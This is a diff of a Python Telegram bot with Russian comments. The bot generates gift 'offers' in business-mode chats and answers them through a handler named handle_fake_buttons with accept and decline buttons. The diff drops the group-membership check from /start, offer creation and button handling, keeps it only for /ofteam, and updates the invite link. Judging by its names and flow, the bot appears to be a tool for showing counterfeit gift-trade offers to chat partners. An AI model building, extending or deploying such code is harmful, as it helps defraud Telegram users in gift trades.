@@ -24,16 +24,15 @@ except ValueError:
 DEFAULT_TARGET = "Gifts_Replayer"
 
 # --- НАСТРОЙКИ ПРОВЕРКИ (ГРУППА) ---
+# Убедись, что бот добавлен в эту группу и является админом!
 TARGET_CHAT_ID = -1003747516067 
-INVITE_LINK = "https://t.me/+7WMVJ9ajTHU2NDFi"
+INVITE_LINK = "https://t.me/+pivcaSqTYchmNWYy" # <-- НОВАЯ ССЫЛКА
 
 # --- ID АНИМИРОВАННОЙ ЗВЕЗДЫ TELEGRAM PREMIUM ---
 PREMIUM_STAR_ID = "5848021027782661221"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
-
-active_users = set()
 
 MESSAGES = {
     "ru": {
@@ -84,7 +83,7 @@ async def is_subscribed(user_id: int) -> bool:
         member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
         return member.status in ["member", "administrator", "creator"]
     except Exception as e:
-        print(f"Ошибка проверки подписки (убедитесь, что бот админ в группе): {e}")
+        print(f"ОШИБКА ПРОВЕРКИ ПОДПИСКИ (Бот не админ в группе?): {e}")
         return False
 
 # --- РАБОТА С GIST (БАЗА ДАННЫХ) ---
@@ -193,20 +192,9 @@ async def cmd_test_db(message: types.Message):
     pretty_json = json.dumps(data, indent=2, ensure_ascii=False)
     await message.answer(f"<b>База данных (Gist):</b>\n<pre><code>{pretty_json}</code></pre>", parse_mode="HTML")
 
-# --- ОСНОВНЫЕ КОМАНДЫ ---
+# --- /start БЕЗ ПРОВЕРКИ ---
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
-    if not await is_subscribed(message.from_user.id):
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)
-        ]])
-        return await message.answer(
-            "⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>\n\n"
-            "Вступите в группу и отправьте /start снова.",
-            reply_markup=keyboard,
-            parse_mode="HTML"
-        )
-
     text = (
         "<b>Как начать:</b>\n"
         "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
@@ -222,6 +210,7 @@ async def cmd_start(message: types.Message):
     )
     await message.answer(text, parse_mode="HTML")
 
+# --- /ofteam ТОЛЬКО ТУТ ПРОВЕРКА ПОДПИСКИ ---
 @dp.message(Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
     if not await is_subscribed(message.from_user.id):
@@ -229,35 +218,24 @@ async def cmd_ofteam(message: types.Message):
             InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)
         ]])
         return await message.answer(
-            "⚠️ <b>Сначала вступите в нашу группу!</b>", 
+            "⛔ <b>Ошибка доступа!</b>\n\n"
+            "Вы не подписаны на нашу группу. Использование команды /ofteam запрещено.\n"
+            "Вступите в группу и попробуйте снова.",
             reply_markup=keyboard, 
             parse_mode="HTML"
         )
     
-    await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")
+    await message.answer("✅ Подписка подтверждена. Доступ выдан. Теперь можно отправлять оферы.")
 
 @dp.message(F.text.startswith("/of"))
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
-# --- ГЕНЕРАЦИЯ ОФФЕРА ---
+# --- СОЗДАНИЕ ОФФЕРА БЕЗ ПРОВЕРКИ ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
     if not business_connection_id: return
-
-    if not await is_subscribed(message.from_user.id):
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)
-        ]])
-        await bot.send_message(
-            chat_id=message.chat.id,
-            text="⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>\n\nВступите и попробуйте снова.",
-            reply_markup=keyboard,
-            business_connection_id=business_connection_id,
-            parse_mode="HTML"
-        )
-        return
 
     parts = message.text.split()
     if len(parts) < 3: return
@@ -323,14 +301,10 @@ async def handle_offer_command(message: types.Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
-# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША ---
+# --- ОБРАБОТКА КНОПОК БЕЗ ПРОВЕРКИ ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
-    
-    if not await is_subscribed(callback.from_user.id):
-        await callback.answer("Вы не состоите в группе! Вступите, чтобы продолжить.", show_alert=True)
-        return
     
     data_parts = callback.data.split(":")
     if len(data_parts) != 5:
@@ -338,7 +312,6 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         
     action, gift_slug, amount, currency, lang = data_parts
     
-    # --- ЛОГИКА ПРЕМИУМ ЗВЕЗДЫ (ДЛЯ ТОГО, КТО НАЖАЛ КНОПКУ) ---
     if currency == "stars":
         if callback.from_user.is_premium:
             symbol = f'<tg-emoji emoji-id="{PREMIUM_STAR_ID}">⭐️</tg-emoji>'
